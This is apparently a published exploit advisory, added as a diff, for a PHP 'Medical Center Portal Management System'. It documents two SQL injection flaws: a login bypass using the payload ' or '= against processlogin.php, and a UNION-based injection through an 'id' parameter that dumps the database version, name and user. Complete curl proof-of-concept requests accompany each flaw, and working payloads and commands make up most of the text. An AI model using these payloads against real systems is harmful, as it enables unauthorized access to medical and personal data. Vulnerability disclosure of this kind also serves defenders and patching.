@@ -1,0 +1,103 @@
+id: 35267
+date: 11/17/2020
+title: Medical Center Portal Management System SQL Injection Vulnerability
+author: gh1mau
+cves: 
+
+# Exploit Title: Medical Center Portal Management System  - SQL Injection(s)
+# Exploit Author: gh1mau 
+# Email: gh1mau.rulez@gmail.com
+# Team Members: Capt'N, muzzo, chaos689 | https://h0fclanmalaysia.wordpress.com/
+# Vendor Homepage: https://www.sourcecodester.com/php/14594/medical-center-portal-management-system.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14594&title=Medical+Center+Portal+Management+System+using+PHP%2FMySQLi
+# Software Release Data: November 16, 2020
+# Tested on: PHP 5.6.18, Apache/2.4.18 (Win32), Ver 14.14 Distrib 5.7.11, for Win32 (AMD64)
+
+
+1. Authentication Bypass
+
+Vulnerable File:
+---------------- 
+/pages/processlogin.php
+
+Vulnerable Code:
+-----------------
+Entry point: (User input is not filtered)
+  line 8: $users = trim($_POST['user']);
+  line 9: $upass = trim($_POST['password']);
+
+Exit point:
+  line 28: $result = $db->query($sql);
+
+Vulnerable Issue:
+-----------------
+Attacker could bypass the authentication using simple sqli login bypass payload
+
+  username: gh1mau' or '=
+  password: gh1mau' or '=
+
+
+POC:
+----
+curl -i -s -k --location --request POST 'http://localhost:88/medic/pages/processlogin.php' \
+--header 'Origin: http://localhost' \
+--header 'Cookie: PHPSESSID=3ijdjbcvocp1qmoi0kbfomhbr5' \
+--header 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
+--header 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' \
+--header 'Referer: http://localhost:88/medic/pages/login.php' \
+--header 'Connection: close' \
+--header 'Sec-Fetch-Site: same-origin' \
+--header 'Sec-Fetch-Dest: document' \
+--header 'Host: localhost:88' \
+--header 'Accept-Encoding: gzip, deflate' \
+--header 'Sec-Fetch-Mode: navigate' \
+--header 'Cache-Control: max-age=0' \
+--header 'Upgrade-Insecure-Requests: 1' \
+--header 'Sec-Fetch-User: ?1' \
+--header 'Accept-Language: en-US,en;q=0.9' \
+--header 'Content-Length: 63' \
+--header 'Content-Type: application/x-www-form-urlencoded' \
+--data-raw 'user=gh1mau%27+or+%27%3D&password=gh1mau%27+or+%27%3D&btnlogin='
+
+
+2. SQL Injection in 'id' parameter
+
+Vulnerable File:
+---------------- 
+/pages/cust_searchfrm.php
+
+Vulnerable Code:
+-----------------
+Entry point: (User input is not filtered)
+  line 25: $query = 'SELECT * FROM customer1 WHERE EMPLOYEE_ID ='.$_GET['id'];
+  
+Exit point:
+  line 26: $result = mysqli_query($db, $query) or die(mysqli_error($db));
+
+Vulnerable Issue:
+-----------------
+Authenticated Attacker could inject SQLi payloads through the 'id' parameter. Other files are als affected with the same issue
+
+Payload:
+--------
+UNION+ALL+SELECT+1,CONCAT_WS(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13--+-
+
+POC:
+----
+curl -i -s -k --location --request GET 'http://localhost/medic/pages/us_searchfrm.php?action=edit%20&%20id=1+UNION+ALL+SELECT+1,CONCAT_WS(0x3a,version(),database(),user()),3,4,5,6,7,8,9,10,11,12,13--+-' \
+--header 'Cookie: PHPSESSID=3ijdjbcvocp1qmoi0kbfomhbr5' \
+--header 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
+--header 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' \
+--header 'Connection: close' \
+--header 'Sec-Fetch-Site: none' \
+--header 'Sec-Fetch-Dest: document' \
+--header 'Host: localhost:88' \
+--header 'Accept-Encoding: gzip, deflate' \
+--header 'Sec-Fetch-Mode: navigate' \
+--header 'Cache-Control: max-age=0' \
+--header 'Upgrade-Insecure-Requests: 1' \
+--header 'Sec-Fetch-User: ?1' \
+--header 'Accept-Language: en-US,en;q=0.9' \
+--data-raw ''
+
+#  0day.today [2023-03-21]  #
